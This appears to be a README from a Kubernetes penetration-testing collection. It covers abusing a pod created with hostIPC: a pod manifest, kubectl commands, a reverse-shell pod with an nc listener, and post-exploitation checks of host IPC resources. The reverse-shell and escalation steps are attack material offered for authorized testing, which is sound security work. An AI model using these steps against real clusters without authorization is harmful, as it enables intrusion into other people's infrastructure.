## You can create a pod with only hostIPC

If you only have `hostIPC=true`, you most likely can't do much. What you should do is use the ipcs command inside your hostIPC container to see if there are any ipc resources (shared memory segments, message queues, or semephores). If you find one, you will likely need to create a program that can read them. 

# Pod Creation

## Create a pod you can exec into
```yaml
apiVersion: v1
kind: Pod
metadata:
  name: pod-hostipc
  labels:
    app: hostipc
spec:
  hostIPC: true
  containers:
  - image: ubuntu
    command:
      - "sleep"
      - "604800"
    imagePullPolicy: IfNotPresent
    name: hostipc
  # Force scheduling of your pod on master mode by uncommenting this line and changing the name
  #nodeName: k8s-master
  restartPolicy: Always
  ```
[pod-hostipc-only.yaml](pod-hostipc-only.yaml)

#### Option 1: Create pod from local yaml 
```bash
kubectl apply -f pod-hostipc-only.yaml   
```

#### Option 2: Create pod from github hosted yaml
```bash
kubectl apply -f https://raw.githubusercontent.com/BishopFox/badPods/main/yaml/hostipc-only/pod-hostipc-only.yaml  
```

### Exec into pod 
```bash
kubectl -n [namespace] exec -it pod-hostipc-only -- bash
```

## Or, create a reverse shell pod
[pod-hostipc-only-revshell.yaml](pod-hostipc-only-revshell.yaml)

#### Set up listener
```bash
nc -nvlp 3116
```

#### Create the pod
```bash
# Option 1: Create pod from local yaml without modifying it by using env variables and envsubst
HOST="10.0.0.1" PORT="3116" 
envsubst < ./yaml/hostipc-only/pod-hostipc-only-revshell.yaml | kubectl apply -f -
```

#### Catch the shell and chroot to /host 
```bash
~ nc -nvlp 3116
Listening on 0.0.0.0 3116
Connection received on 10.0.0.162 42035
```

# Post exploitation 
#### Look for any use of inter-process communication on the host 
```bash
ipcs -a
```

Reference: https://opensource.com/article/20/1/inter-process-communication-linux



#### Attacks that apply to all pods, even without any special permissions
* Cloud metadata service
* `Kube-apiserver` or `kubelet` with `anonymous-auth` enabled
* Kubernetes exploits
* Hunting for vulnerable application/services in the cluster

# Demonstrate Impact

If you are performing a penetration test, the end goal is not to gain cluster-admin, but rather to demonstrate the impact of exploitation. Use the access you have gained to accomplish the objectives of the pentration test.
